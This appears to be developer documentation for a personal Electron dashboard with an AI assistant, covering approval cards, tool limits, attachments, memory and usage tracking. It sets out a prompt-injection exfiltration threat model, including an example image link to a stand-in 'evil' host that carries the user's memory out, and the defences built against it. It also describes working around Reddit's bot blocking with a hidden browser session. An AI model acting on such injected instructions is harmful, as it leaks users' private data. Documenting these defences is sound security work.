  `index` and run only after the stream ends. A stream that ends with neither
  `finish_reason` nor `[DONE]` is a failure, never a short answer. The timeout
  is an **idle** timer re-armed per chunk (keep-alive comments count). OpenRouter
  can report a failure as a **200 with an `error` body**, so `complete()` checks
  the body, not just the status.
- **Stop** aborts the request (`assistant:stop`, keyed by `requestId`); what had
  streamed is kept, and a turn stopped before any text reads `(stopped)` (emitted
  through the same path as real text so a reload matches the live bubble).
- **Actions that change data wait for the user.** `complete_task`,
  `reschedule_task`, `create_task` and `forget` return an approval from
  `prepareTool`; the loop sends `assistant:approval` and awaits
  `assistant:approve`. **Changes from one model step share one card**: the loop
  prepares every call first (read-only lookups that build each summary), then
  asks once. One change gets the classic Allow/Deny card; several get a batch
  card (`approval.items`, `tool: "batch"`) with every item ticked, answered with
  the ticked ids (`approve(id, allow, allowedItems)`). An unticked item, an id
  not on the card, Deny all, silence and Stop all report to the model as
  declined; read-only calls in the same step run while the card is open.
  **The card is built from authoritative data, never from
  the model's description**: tasks are looked up in Todoist by id and quoted by
  their real title, `forget` quotes the exact lines it will delete (and removes
  only those, by exact match). Silence (120s), Stop, or a closed window all mean
  **no**. Google Calendar is read-only (`calendar.readonly`), so there is no
  event-creation tool — adding one means re-authorising with a wider scope.
- **Tools added later follow the same rules.** `approve_transaction` and
  `categorize_transaction` look the transaction up in YNAB by id and quote
  *its* payee/amount/date; a category is resolved by exact name against
  `getCategories` and refused if it is unknown or ambiguous across groups (it
  never guesses). `reader_save_link` accepts only `http(s)` and quotes the
  normalised URL it will save. `reader_move_to_inbox` only accepts an id that
  `reader_feed_unread` already loaded (`findCachedFeedItem`), so the card can
  quote a real title. `github_list_prs` is the read-only full list behind the
  five-per-repo widget. All four mutating ones are in `ASSISTANT_MUTATING_TOOLS`.
- **Slash commands** (`assistantCommands.ts` + `assistantSkills.ts`): typing `/` in
  the composer (tab or quick panel) offers **enabled** commands — skills from
  `~/.agents/skills/*/SKILL.md` and the user's own saved prompts, both managed
  in Settings → Assistant → commands (`AssistantCommandsCard.tsx`). **Nothing is
  on by default**: the folder is mostly coding-workflow skills that need a shell
  the Assistant lacks, so each skill is opted into. One `assistant_commands`
  table holds both kinds, keyed by name. A command turn stores the user's text in
  `content` (what the transcript, title and search show) and the command's
  instructions in `injected`; `toWire` puts `injected` in front of `content` in
  **every** later request too, so follow-ups still know what was asked. Skill
  text is read from disk at use, so a SKILL.md edit applies next time. Each
  command has a **tool allowlist**: unset = every tool that only reads
  (`defaultCommandTools()`: not `MUTATING_TOOLS`, not `remember`); a custom list
  is the only way to give a command a mutating tool. It applies to the turn that
  used the command only, and is enforced twice: the model is shown just those
  tools, and `runTurn` refuses a call to any other (`offeredToolNames`).
  Regenerate keeps the command; if it has since been switched off it falls back
  to read-only. `read_skill_file(skill, path?)` reads or lists files inside one
  **enabled** skill's folder — both folder and target are `realpath`ed and the
  target must stay under the folder, so `..` and an escaping symlink fail; text
  only, bounded. It is offered to skill turns and to any chat that has used a
  command, never to a plain chat. Skill folders are often symlinks, which the
  scan follows. The skills path is fixed at `~/.agents/skills`.
- **Image generation** (`openaiImages.ts`; `generate_image`): POSTs to OpenAI's
  Images API (shape checked against the reference: GPT image models return
  `data[0].b64_json`, three standard sizes, `low|medium|high` quality). Needs a
  **regular project key** in Settings → Integrations → OpenAI (`openai.apiKey`) —
  the existing Admin key can't generate — and the tool is only offered when one
  is set. Model defaults to `gpt-image-1` (`openai.imageModel`). It spends money,
  so it is in `ASSISTANT_MUTATING_TOOLS`: always behind a card that quotes the
  **exact prompt**, shape and quality that will be sent (never the model's
  paraphrase), refused by Regenerate, absent from a command's default allowlist,
  and capped at 2 per reply. Quality defaults to `medium` because `auto` may pick
  the expensive one. The PNG is stored like any attachment (hashed file, same
  validation) and rides on the **tool message's** `attachments`, so the transcript
  shows it under the reply and a reopened chat still does; the model is only told
  that it exists, never given the bytes. **Defaults live in Settings**
  (`openai.imageShape`, `imageQuality`; unset = square 1024x1024, medium): the
  model is told to omit shape/quality unless the image needs another shape or the
  user asks, and the card always shows the resolved size and quality. An invalid
  stored value falls back rather than failing. Images in the transcript open in
  a larger viewer (`ImageViewer.tsx`: Esc, backdrop click or the close button
  closes it; Save only for stored attachments, whose id is the content hash). `PreparedTool.run` now receives the abort
  signal, so Stop cancels a generation in flight. The transcript's "Save image…"
  uses a save dialog (`assistant:attachments:save`) that copies by validated id.
  Doesn't count as third-party text, so it doesn't force `remember` to ask.
- **Attachments** (`assistantAttachments.ts`; composer: paste, drop, or the `+`
  button, up to 5 files / 12 MB): PNG, JPEG, GIF and WebP images for vision
  models, and small UTF-8 text files. **Main trusts nothing the renderer says**:
  the type comes from sniffing the bytes (a `.txt` that is really a PNG is an
  image, a "PNG" that isn't is text or refused), names are scrubbed, binary and
  oversized files are refused, and the whole batch is all-or-nothing. A file's id
  is the SHA-256 of its content and is also its filename under
  `userData/assistant-attachments/`, so identical pictures share one copy and no
  user input ever forms a path (ids are re-validated against `^[a-f0-9]{64}$`
  wherever they are read or deleted). The renderer shrinks big pictures to a
  1568px long edge first (JPEG, transparency flattened to white). Images are
  stored on disk; text files are stored **inline** in the message row (cut at
  60,000 characters, and the model is told), so `toWire` stays pure — it takes a
  resolver for image data URLs. A user message's stored `content` stays what was
  typed; `attachments` is a JSON column on `assistant_messages`. On the wire
  `content` is a plain string unless the message has images (then OpenAI-style
  parts), so a chat without images is unchanged byte for byte. **Images are only
  re-sent for the last 2 user turns**; older ones become a one-line note, because
  they are the heaviest thing in a chat. Each counts ~1000 tokens toward the
  compaction estimate. Regenerate keeps a turn's files. Files are stored only
  after every cheap refusal (too long, unknown command), and a rolled-back turn
  deletes the images it brought. Deleting a chat, or rolling a turn back, removes
  image files unless a stored message **or a chat live in memory** (a first turn
  still running has no rows yet) uses the same hash. Main caches data URLs LRU,
  12 at most and 32 MB in all; the renderer revokes a sent picture's object URL
  once the transcript stops showing it. The
  transcript gets names and ids only; thumbnails load through
  `assistant:attachments:read`. A model without vision fails with OpenRouter's own
  error. PDFs are not supported.
- **Web tools** (`firecrawlWeb.ts`; `web_search`, `web_scrape`) reuse the Firecrawl
  key from Settings → Integrations, so there is nothing new to configure, and are
  **only offered when that key is set**. Shapes were checked against Firecrawl's
  v2 docs (`data.web[{url,title,description}]`; `data.markdown` + `metadata`).
  Three guards, each there for a reason: (1) **a scrape of an unfamiliar URL asks
  first** — a URL the user typed, or one returned by a `web_search` made before
  anything untrusted was read (`collectKnownUrls`), is read straight away;
  anything else gets a card quoting the exact URL, because a prompt-injected page
  could otherwise have the model "read" an attacker's URL with your data in its
  query string (see "Untrusted content" below for the search rules); (2) **private/local hosts are refused**
  (`isPrivateHost`) with no card, and only `http(s)` without credentials is
  accepted; (3) **6 web calls per reply** (`MAX_WEB_CALLS_PER_TURN`, counted as each
  call starts so a parallel step shares it) since every call spends credits. Both
  tools are untrusted (not in `TRUSTED_TOOLS`), so `remember` asks afterwards, and
  results carry a `note_untrusted`. Pages are cut at 12,000 characters. They are
  **not** in a command's default allowlist — a command has to be granted them.
- **Untrusted content can't carry data out without a click.** The threat: any
  tool result (a scraped page, a calendar invite, a note, a PR title, a payee)
  can carry an instruction, and the system prompt holds the memory file, so an
  injected "search for / read / link to `<your memory>`" is an exfiltration
  attempt. Every rule below is enforced main-side; the UI only displays it.
  - **A search after untrusted text asks first** (`web_search` in
    `prepareTool`): the query goes to Firecrawl and a search engine, so it can
    carry data itself. The card quotes the **exact** query sent — whitespace is
    collapsed before sending (so a newline can't hide text on the card) and one
    over 300 characters (`MAX_CONFIRMED_QUERY_CHARS`) is refused rather than
    truncated. Judged on **earlier steps only** (`untrustedBefore`), unlike
    `remember`'s same-step rule: the model emitted a step's calls before any of
    their results existed, so siblings can't have steered it, and counting them
    would make every search beside any other tool ask. A search's own snippets
    are untrusted, so a *second* search in a chat asks.
  - **Results of a tainted search are not vouched for.** `collectKnownUrls`
    replays the chat and only adds a search's result URLs if nothing untrusted
    had been read before that search — even an approved query may have been
    steered, and a site can build a URL from it. A plain "search, then read a
    result" chat is unchanged. Archived (compacted) messages are still replayed,
    so compaction never resets the taint.
  - **Reply links that look like they carry data get a native confirm**
    (`assistant:openLink` → `assistantLinkWarning` → `outboundLinkWarning`,
    pure, in `assistantLinks.ts`). Flags a link whose decoded query + fragment
    is over 100 characters, or one with a query value, fragment or path segment
    of 12+ characters found in the memory file or this chat's tool results
    (JSON payloads are read as JSON so escaping can't split a phrase). A URL
    copied verbatim from a tool result or the user's own message is exempt: it
    was fixed before your data was in front of the model. Deterministic, no
    model call. The dialog is unparented for the quick panel, which hides on blur.
  - **CSP.** `assistant-quick.html` has a strict one (`default-src 'none'`, images
    only `'self' data: blob:`, `connect-src 'none'`), so nothing in the panel can
    reach the network even if rendering regresses. `index.html` gets a partial
    one: no remote scripts, `connect-src 'self'`, no frames/objects/forms — but
    `img-src` has to allow `https:`, since note previews, Todoist descriptions and
    Reader feed thumbnails show images from arbitrary hosts (an allowlist of the
    YouTube/Reddit/Spotify hosts would break those). So in the dashboard,
    `remoteImages: false` (below) is still what stops a zero-click image leak.
    `style-src` keeps `'unsafe-inline'` (CodeMirror and React inject styles; CSS
    can only fetch via `img-src`/`font-src`, which are restricted). The tags are
    written for the build; `devCsp()` in `electron.vite.config.ts` relaxes
    `script-src` (React Refresh's inline preamble) and `connect-src` (HMR
    websocket) on the dev server only. `capture.html` has none yet.
- **Memory is retrieved, not always sent in full** (`assistantMemoryIndex.ts`,
  pure). The markdown file stays the source of truth — hand-edited, possibly in
  Obsidian — so there is **no separate index to keep in sync**: `searchMemory`
  scores the file's lines directly with BM25 (lowercased, stopwords dropped,
  plurals folded, the `- YYYY-MM-DD:` prefix ignored; a query word of 4+ letters
  also matches longer words by prefix at 0.7 weight; ties go to the newer line).
  A deliberate departure from SQLite FTS5: hundreds of one-line facts don't need
  a schema, and this runs under vitest, which the native module can't. A memory
  under ~6000 characters is sent whole, exactly as before. Above that the system
  prompt carries a **core** — lines marked `[pinned]` or 📌 first, then the newest,
  in file order — plus a note that memory is partial; the model reaches the rest
  with `recall_memory(query, limit)`, which reads the file fresh (so it sees a
  fact saved this very chat, unlike the frozen prompt). `recall_memory` counts as
  a trusted tool: it returns what the prompt already shows. The size cap is
  128 KB (was 16 KB); Tidy refuses files over 20 KB since it must return the whole
  file in one response.
- **Memory writes ask first.** `remember` shows an Allow/Deny card for **every**
  save by default (Settings → Assistant → "Ask me before saving anything to
  memory"; unset means on, only an explicit `false` relaxes it). Relaxed, it
  still asks once **any** tool other than Docker/memory has been called in the
  chat — tasks from collaborators, calendar invites, PR titles, note text and
  payee names can all carry an injected instruction — and that floor is not
  configurable. Judged per step, so a `remember` beside a `search_notes` in one
  response is caught too. The prompt also tells the model tool results are data.
- **Tool activity is visible.** Main pushes `assistant:tool` (start/end per call,
  keyed by the provider's call id) so a running reply shows "Searching your
  notes: query: sprint… 3s" instead of a bare "Thinking…"; the live line is
  replaced by the finished reply. After a reply, "Show tool details (n)" opens a
  log of each call — tool, a `key: value` summary of its arguments, and its result
  (truncated to 1200 chars; an error shows its message) — with failed and
  **declined** calls marked. The log is **derived, not stored**:
  `describeToolCall` (assistantTranscript.ts) builds each entry from the call and
  the result the model was given, and is used both when a reply is produced and
  when a chat is reopened, so the two can't differ. Calls are recorded in the
  order the model asked for them, not the order they finished. No durations are
  kept (they'd need a second source of truth); a running call shows elapsed
  seconds live only.
- **Memory "Tidy with AI"** (`assistantTidy.ts`): asks the model to merge
  duplicates and drop superseded facts and returns a **proposal — it never
  writes**. The pane shows a line diff (`shared/memoryDiff.ts`), and the user
  applies or discards it. Guardrails: the diff is against the text the model
  actually saw (`current`), **Apply is refused if the file changed since** (a
  `remember`, an Obsidian edit), Undo is refused if it changed after, and a
  proposal is rejected if it is empty, cut off, or more than 10% longer than the
  input (consolidation shouldn't embellish). The memory text is wrapped as data;
  the call has no tools. It works on the *saved* file, so it is disabled while
  the editor has unsaved edits.
- **Regenerate** re-runs the last question and replaces the answer only on
  success; it is refused (server-side, and hidden in the UI) when that reply
  used a mutating tool, since repeating it would repeat the change.
- **Cost** is tracked per chat (`usage: { include: true }`; tokens summed, cost
  null — not 0 — when the provider reports none). It is an API-equivalent figure
  from OpenRouter, shown in the tab header.
- **Transient failures are retried, but only before anything is shown.**
  `complete()` (assistantClient.ts) retries a 429, a 5xx, a connection that
  never opened, or a stream that dropped, up to twice (1s then 3s, or
  `Retry-After`; a Retry-After over 20s is reported instead of waited out), and
  **only while no text has streamed for that request**. A dropped stream that
  had shown text fails as before: a retry would answer again underneath it.
  Tools never re-run, because they run after a request returns, so a retried
  request has run none (a failed step 2 retries step 2 only). This is the one
  automatic retry of a POST in the app, and it's safe because a completion
  changes nothing. An idle timeout is not retried (another 90s), and neither is
  a 402 or 4xx. Usage from failed attempts is added to the final result: it was
  billed. `RETRY_POLICY` is exported so tests can zero the delay.
- **Fallback models** (Settings → Assistant → Fallbacks) go to OpenRouter's own
  `models` parameter (`[model, ...fallbacks]`, deduped; `model` is still sent),
  so OpenRouter does the failover and bills whichever model answers. That model
  comes back in each response's `model` field (every SSE chunk carries it), is
  stored on the assistant message (`assistant_messages.model`, additive
  migration; `toWire` never sends it), and is shown at the end of the reply's
  action row, live and after reopening. Summaries use the fallbacks too; title
  requests don't (they have their own Title model).
- **Spending caps** (USD, unset = none, non-positive = none). Every model request
  goes through `callModel` in assistant.ts, which writes to `assistant_spend`
  (one row per local day: cost, requests, `unpriced`). That covers replies,
  titles, summaries, and turns that later failed or rolled back, since all of
  them were paid for. A chat's `cost_usd` can't answer "today", and a failed
  turn never reaches it. **Per reply**: checked before each request, counting
  this turn's automatic summary and steps, not its title, which lands later.
  Over the cap, the loop stops calling the model and closes via `failTurn`
  (rollback if nothing changed, a note if something did), with `needsSetup` so
  the error offers Settings. It can overshoot by the step that crossed the
  line. **Per day**: checked once at the start of a turn. At the cap the turn is
  refused before anything is stored or sent, with a reason naming the cap, the
  spend, any unpriced requests and Settings → Assistant (also `needsSetup`).
  **No reported cost is not $0.** An unpriced request (cost null, or a
  successful response with no usage at all) is counted in `unpriced`, can't
  trip a cap, and makes the reply carry `costUnreported` when a cap is set. The
  UI then says so under the reply. Settings shows today's spend.
- **Model check.** Saving a changed model or fallback list looks each slug up in
  OpenRouter's public `/api/v1/models` (no key, cached 10 min,
  `fetchWithTimeout`). It warns if a slug is unlisted (variants like `:nitro`
  match their base) or doesn't list `tools` in `supported_parameters`. It's
  advisory, and the settings are saved either way, since the list can lag a new
  model. The main model's `context_length` suggests a Compact-at value (40% of
  the window, rounded down to 1000, capped at 100k, min 2000) with a one-click
  "Use". It is shown only when it differs from what's set.
- **Folders** group the history list. `assistant_folders` (id, name, sort order) plus
  a `folder_id` column on `assistant_chats`; flat, no nesting. Deleting a folder
  returns its chats to the top level and never deletes one, and `listChats` LEFT
  JOINs the folders table so a chat pointing at a folder that is gone reads as
  top level instead of vanishing. Filing a chat doesn't touch `updated_at`, so
  tidying never reorders the list, and a later reply keeps the chat where it is.
  In the UI a chat row is `draggable` onto a folder header (or onto the "Chats"
  area to take it out), with a "Move to folder" menu on each row as the
  keyboard/mouse alternative; the drag payload is a private MIME type so files
  or text dragged in from outside can't be mistaken for a chat. Folded-shut
  folders are remembered in `localStorage`. While searching, the list is flat.
- **History UI**: search (every term, in the title or in what was *said* —
  `search_text` excludes tool payloads and call arguments, or "tasks" would match
  everything), pinned-first, inline rename, delete with confirm. History controls
  are disabled mid-reply so a delete can't race the end-of-turn save.
- **Save to notes** goes through the existing `capture:submit` (same path as
  Quick Capture, so the owning widget reloads instead of autosaving over it).
  `formatCaptureEntry` indents continuation lines so a multi-line markdown
  answer stays inside its list item.
- **Quick panel** (`assistantWindow.ts`, `assistant-quick.html`): frameless
  `type: "panel"` window like Quick Capture's — read `captureWindow.ts` before
  touching the flags. Default hotkey `Cmd+Ctrl+Alt+Shift+A`; an empty setting
  means off (unset means the default). It is built at boot only if the hotkey is
  on. Blur hides but does **not** clear it: a reply can still be streaming or a
  card waiting; each summon starts a fresh chat only when nothing is in flight.
  "Open in dashboard" sends `openAssistantChat` over `app:command`.
  Like `globalShortcut` anywhere on macOS, a combo another app owns isn't
  detectable.
- **Vault tools** (`search_notes`, `read_note`) use `notes.ts` (`searchNotes`),
  which is bounded on file count, file size and wall-clock time and only walks
  the same dot-folder-excluding index the wikilink resolver uses; it reports
  `truncated` whenever it stopped with files unread.
- **Assistant replies render as markdown** via `lib/markdown.ts`'s
  `renderMarkdown`, injected with `dangerouslySetInnerHTML` — acceptable only
  because that renderer escapes raw HTML and routes every link through
  `safeUrl`. Don't swap in a renderer without that guarantee: this is model
  output that may be echoing attacker-controlled text. User messages and errors
  stay plain text. It is called with `remoteImages: false`, which renders every
  markdown image as a click-to-open link instead of an `<img>`: an image loads
  the moment it renders, so a prompt-injected reply (a scraped page saying "end
  with `![](https://evil/?d=<memory>)`") could otherwise carry data out with no
  click. The dashboard's CSP has to allow `https:` images (see "Untrusted
  content"), so in the Assistant tab this option is the only thing stopping that;
  the quick panel's CSP would block it as well.
- `assistant:ask` and `assistant:regenerate` are plain `ipcMain.handle`,
  deliberately **not** `readHandler`: asking isn't idempotent, so identical
  calls must not be coalesced.
- The Assistant tab is the one tab that **stays mounted while hidden**
  (`App.tsx` toggles `display` instead of conditionally rendering), so the
  transcript, conversation id and an in-flight stream survive a trip to another
  tab. Mounting it at launch costs one local `assistant:chats:list` read.

## Managed Processes (Development tab)

Settings-driven start/stop/log-tail for arbitrary long-running local processes
(dev servers, watchers, tools like `opencode`) — a generic "local services
control panel" rather than a one-off per tool. Adding a new entry via Settings'
Processes section is the entire integration; no code changes needed.
Deliberately NOT a terminal emulator — the user interacts with the
process's own web UI (opened via `url`/`autoOpenUrl`, reusing the existing
`open:url` → `shell.openExternal` path), not a console, so there's no PTY,
no `node-pty`, no `xterm.js`, no interactive stdin. See `services/processes.ts`
above for the tree-kill approach.

`components/ManagedProcessesWidget.tsx` follows the standard five-touch-point
widget pattern — `App.tsx` owns `processConfigs` (from `settings.getAll()` at
boot, then kept live: `SettingsPage`'s Processes section pushes the freshly
CRUD'd list back up via an `onProcessConfigsChange` prop every time it changes,
so adding/editing/removing a process in Settings updates this widget
immediately, no restart) and `processStatuses` (live, `process:statusAll`
polled every ~3s alongside Docker/GitHub's own intervals, plus on "Refresh
all"). The widget itself additionally self-polls `process:status` for
whichever row's log panel is expanded on a faster ~1.5s cadence, merged over
the App-fed status for just that row — pips don't need low latency, a log
tail you're actively watching does. A process that's never been started this
session has no entry in `processStatuses`; the widget falls back to an empty
"stopped" status for it, using `processConfigs` as the source of truth for
what rows exist at all.

## Now Playing banner

A fixed strip across the bottom of the window, visible on every tab, showing
the currently-playing track's title/artist/album and artwork — but only while
Spotify is actually playing something. Reads the local **Spotify.app directly
via AppleScript** (`services/spotify.ts`), not the Spotify Web API — no OAuth,
no client ID/secret to register, consistent with `services/forklift.ts`'s
"shell out to a local macOS app" pattern. `artwork url of current track` is a
Spotify CDN URL usable directly as an `<img src>`; it's absent for some local
files not synced to Spotify's CDN, which `NowPlayingBanner.tsx` handles by
simply omitting the artwork rather than showing a broken-image icon.

The AppleScript returns one of three sentinel states — not running, running
but paused/stopped, or playing — collapsing any transient failure (e.g.
Spotify quitting mid-query) into "not running" rather than surfacing an
error. Fields are joined with the ASCII unit separator (`\x1F`) rather than a
comma, since a track/artist/album name could plausibly contain one.

Polls on a **hardcoded 4s interval** in `App.tsx`, deliberately not
Settings-configurable like Docker/GitHub/Git's intervals: those trade off
against a real constraint (API rate limits, daemon query cost) that doesn't
exist for a local `osascript` call, so there's nothing to tune. The one real
piece of config — whether to run this poller at all — is a
`spotify.enabled` toggle in Settings → General, off by choice of a user who
doesn't use Spotify; disabling it clears `nowPlaying` and stops the interval
entirely, not just the display.

## Home attention strip

`components/TodayStrip.tsx` renders a row of chips above Home's grid — overdue
and due-today tasks, the next timed calendar event, red CI, PRs awaiting
review, crashed processes, overspent budget categories, unapproved YNAB
transactions — ranked alert → warn → info and linking to the owning tab. The
rules are `lib/today.ts` (`buildTodayItems`), pure with the clock passed in,
and add no fetching: everything comes from state `App.tsx` already holds. The
one new poll is `loadYnabUnapproved` while Home is foreground, since that
count otherwise only loaded with Finances. A source that is null or `ok:
false` contributes nothing, and "Nothing needs your attention" shows only
once Todoist and GitHub have both answered (`todayReady`), so launch never
flashes a false all-clear. "Next event" is suppressed when the calendar widget
is paged to another day. The minute clock is local to the strip so it doesn't
re-render the dashboard.

## Debt tab

Vocabulary is in `GLOSSARY.md`; the one hard-to-reverse decision (the plan models
only the **carried balance**, never card spending) is ADR 0001 in the Le Recueil
vault (`raw/docs/ADR`).

- `src/shared/debtPlan.ts` is the whole projection — pure, cent-rounded, tested
  in `debtPlan.test.ts`. Month order: interest, minimums (capped at balance),
  the extra pool in strategy order, then one-time payments. A minimum that
  isn't needed (paid-off debt, final partial month) frees up into the pool, which
  *is* the rollover. **Minimums only** is the baseline: no extra, no rollover,
  no one-time payments. Capped at 600 months; what still owes is `neverPaysOff`.
- The projection runs in the renderer on every edit (`DebtTab.tsx`), so there is
  no IPC for results. `lib/debtPlanView.ts` turns Debts + live YNAB balances into
  carried balances (`resolveDebts`) and renders the export; only a negative YNAB
  balance counts as owed. A manual **balance override** is used as the carried
  balance as-is; Pay-in-full spending is subtracted only from a live balance. For a
  linked debt it defaults to **auto**: `ynab:monthSpending` (`getMonthSpending` in
  `ynabInsights.ts`) sums this calendar month's non-transfer transactions on the account,
  netting refunds and skipping interest/fee payees, capped at the balance owed. It is the
  calendar month, not the card's statement cycle, deliberately. If the fetch fails the
  debt is flagged `spendingUnknown` rather than silently subtracting nothing.
  The "higher than your plan assumes" hint only applies to the override case.
- Persistence: `services/debts.ts` — `debts` and `debt_one_time` tables, plus the
  single plan as a `debtPlan` JSON row in the generic `settings` table. Picking a
  Card in the debt form prefills name/APR/YNAB link once; it is not a live link.
- The tab is appended after Assistant by `ensureTabDefaults()` (appended, not slotted
  in); drag it next to Finances.
- Export is a save dialog (`debts:exportMarkdown`) writing YAML frontmatter, the
  inputs, the strategy comparison and the full monthly schedule. No history is stored.

## Command Palette

`⌘P`/`Ctrl+P` opens a global fuzzy-filter launcher over tabs, Claude Code
projects, Local Apps/Learning links, pinned Notes, Docker start/stop, and a
couple of quick actions ("Refresh all", "New scratchpad note"). It's app-wide navigation, not
a per-tab widget, so it skips the five-touch-point pattern above:
`src/renderer/src/palette.ts` holds the action registry (`buildActions()`
rebuilds the list fresh every time the palette opens, from whatever state
`App.tsx` already has — no new IPC), and
`components/CommandPalette.tsx` is the overlay itself. The global keydown
listener lives in `App.tsx`; it's renderer-only (no Electron `globalShortcut`),
so it only fires while a Command Center window is focused.

**Why `⌘P` and not the more usual `⌘K`:** this listener is on `window` and
calls `preventDefault()`, so it wins against any CodeMirror binding no matter
what the editor asks for — and `⌘K` is the near-universal "insert link"
shortcut, which the markdown editor now uses. Anything bound here is
effectively taken away from every editor in the app, so keep that in mind
before adding more.

## Claude Code usage

The **Claude** tab reads `~/.claude/projects/**/*.jsonl` — the transcripts
Claude Code writes anyway — and reports tokens and estimated cost by day,
project and model, plus a list of recent sessions with a Resume action.
Entirely local: no API token, no network. Resume reuses `launcher.ts`'s
`openInTerminal(cwd, "claude -r <id>")`; the session id is the transcript's
filename.

**Three things are load-bearing correctness, not optimizations.** Each one
produces believable-but-wrong numbers if broken, which is why the verification
below checks them by size rather than by eye:

- **Dedupe on `(requestId, message.id)`.** Resuming or forking a session copies
  earlier messages into the new transcript, so the same request appears in
  several files — 46.7% of usage records here are duplicates. Skipping this
  roughly **doubles** every figure ($340 → $688 on the same window).
- **Walk recursively.** Subagent turns live one level deeper, in
  `<project>/<session-id>/subagents/agent-*.jsonl` (`isSidechain: true`). They
  are real spend; a one-level scan silently understates cost. Those files are
  attributed to the parent session named by their directory and are never
  listed as sessions of their own.
- **Resolve rates from each message's own date.** `claudePricing.ts` carries
  intro pricing with a cutoff; Sonnet 5's intro period covers essentially all
  existing history, and pricing it at standard rates overstated a real month by
  ~26%.

Two further details worth not "simplifying":

- **Cache creation is split by TTL** (`ephemeral_5m` / `ephemeral_1h`) because
  they're priced differently — 1.25× vs 2× the input rate — and the 1h bucket
  dominates. Cache *reads* are ~99% of all tokens, so the cache split is
  basically the whole cost story.
- **An unknown model is not free.** Anything without a rate keeps its tokens
  counted and renders as `unpriced` with no cost, rather than contributing $0
  and quietly deflating the total. `<synthetic>` records legitimately carry
  zero tokens; that's not the same thing.

Performance: transcripts here are ~390MB across 43 files, but a full scan takes
well under two seconds because `line.includes('"usage"')` skips the enormous
attachment lines before `JSON.parse` runs. That's why there's no worker process
and no persistent cache. Files are append-only, so results memoize per file on
`(size, mtimeMs)`; a refresh re-parses only what changed (~1.4s cold, ~270ms
warm). `fs.promises.glob` is deliberately not used — it needs Node 22 and
Electron 33 ships Node 20.

**Tokens lead; dollars are a value figure, not spend.** This is a deliberate
reframe, not a styling choice — leading with cost on a subscription implies a
bill that never existed. Token volume is what's actually consumed, so it's the
headline; the dollar figure is labelled *API-equivalent* and expressed as a
multiple of the plan price ("$357 in 30 days — about 18× a $20/mo Pro plan"),
which is the one genuinely useful thing it says to a subscriber. Don't promote
cost back to the headline.

Keep the dollar figure rather than dropping it, though: it's what weights Opus
against Sonnet. Raw token counts invert the picture — Opus used *fewer* tokens
than Sonnet last month but represents more value, because its input rate is 5×.

The plan is detected from `~/.claude.json`'s `oauthAccount.organizationType`,
and the price used is printed inline so a stale entry in `PLAN_PRICES` is
visible rather than silently skewing the multiple. An unrecognised plan is
named but gets no multiple.

**There is no local record of quota remaining**, so this cannot show how much
of a subscription is used up — checked: `rateLimits` appears in transcripts
only inside a 429 error payload, after the fact. Don't imply otherwise in the
UI.

## Codex subscription usage

The **OpenAI** tab leads with local Codex subscription telemetry, then keeps
the separate Admin API usage/cost cards below it. `services/codexUsage.ts`
reads `${CODEX_HOME:-~/.codex}` only; Codex works without the Admin API key,
and an API credential failure must never suppress the local panels.

Token events come from `token_count.info.last_token_usage`. Cached input is a
subset of input and reasoning output is a subset of output, so the headline
total is always `input + output`; the subset fields are breakdowns only.
Copied/forked history is deduped on the original event timestamp plus token
tuple, and each event is attributed to the active `session_meta` /
`turn_context` cwd and model. Active and archived rollouts both count toward
history, but archived threads are excluded from Recent sessions.

Unlike Claude, Codex writes a real rolling-limit snapshot alongside token
events. Window labels come from `window_minutes` rather than assumed 5h/7d
names, and both current `resets_at` and legacy `resets_in_seconds` forms are
supported. A window whose reset passed is marked stale — never reset to a
made-up 0% — until Codex reports again. Plan and optional credit fields are
shown from that same snapshot. These are subscription limits, not API billing
limits.

Recent session metadata prefers the newest compatible `state_*.sqlite`
`threads` table, with `session_index.jsonl` + transcript metadata as the
schema-change fallback. The state database is opened read-only and closed per
read. Resume validates the UUID and working directory before launching
`codex resume <id>` through the existing terminal service.

## Social tab

Two widgets, two very different answers to the same question — "can this read
a public feed without registering an app?"

**YouTube: yes, so it doesn't.** `services/youtube.ts` reads the public
per-channel Atom feed (`youtube.com/feeds/videos.xml?channel_id=UC…`). No API
key, no quota, no OAuth — the same call as `services/spotify.ts` preferring
local AppleScript to the Spotify Web API. The cost, accepted knowingly: only
the ~15 most recent uploads per channel, no duration or view count, and Shorts
indistinguishable from regular uploads. Getting any of those means the Data
API v3, a key in Settings, and daily quota for metadata this widget doesn't
show.

**The feed needs a channel ID, but nobody knows their own channel ID.** So
Settings accepts an @handle, a pasted channel URL (`/@handle`, `/channel/UC…`,
and the legacy `/c/` and `/user/` forms), or a raw ID, and
`resolveYouTubeChannel` turns it into an ID **once, at add time** — the channel
page is 1–2MB, so it must never be fetched on a poll. An empty label fills in
from the channel's own name, so pasting a handle is the whole interaction.

**Playlists work too.** The same feed serves them under `playlist_id` instead
of `channel_id`, and `feedUrl()` picks between the two from the id's shape —
a channel id is always `UC` + 22 characters, so nothing else needs to remember
which kind a row is and no column was added for it. `parseChannelInput` also
accepts a `?list=` link, including the `/watch?v=…&list=…` form that "share"
gives you from inside a playlist. In a playlist feed the per-entry
`<author><name>` varies, which is exactly what a card should show.

**Read the ID from `<link rel="canonical">`, never from the first
`"channelId":"UC…"` in the page.** That first match belongs to whatever channel
the page happens to reference first — verified live against @LinusTechTips and
@fireship, where it is a *different channel entirely*. Using it would silently
build a feed of someone else's videos, which looks like it works. Resolving a
bare ID goes to the feed instead, which is far smaller and also yields the real
channel name. An unknown handle gets a **200 soft-404** with no canonical link,
so a missing match means "no such channel", not a parse failure.

**Reddit: also yes, but only because this is Electron.** Reddit doesn't block
anonymous reads — it blocks clients that don't *look like a browser*. Verified
2026-09-13 from this machine: plain HTTP gets **403** on `/r/<sub>.json` and
**429** on the second `.rss` request even at 20s spacing, regardless of the
User-Agent string sent. The block is on the TLS handshake and the missing
session, not on the UA header.

Glance/Dynacat work around that with [uTLS](https://github.com/refraction-networking/utls)
to forge a Firefox TLS fingerprint, then regex a JS challenge off the homepage
and trade the "solution" (the challenge is literally `x => x + x`) for a `loid`
cookie. **We need none of it** — we ship a real Chromium, so Reddit doesn't
even serve us the challenge page. `services/reddit.ts` instead:

1. Keeps its own `persist:reddit` session partition — reddit.com cookies and
   nothing else, clearable without touching anything else.
2. Warms it once by loading `reddit.com` in a **hidden BrowserWindow**, letting
   Chromium run Reddit's own JS and collect a normal logged-out session cookie,
   exactly as opening a tab would.
3. Then reads `/r/<sub>/new.rss` (Atom) with plain `session.fetch`.

**2026-10-23: the JSON listing is now blocked even from the warmed session** —
`/r/<sub>/new.json` returns the same 403 block page for both `session.fetch`
and an in-page `fetch()` after a normal load, while `.rss` still answers 200.
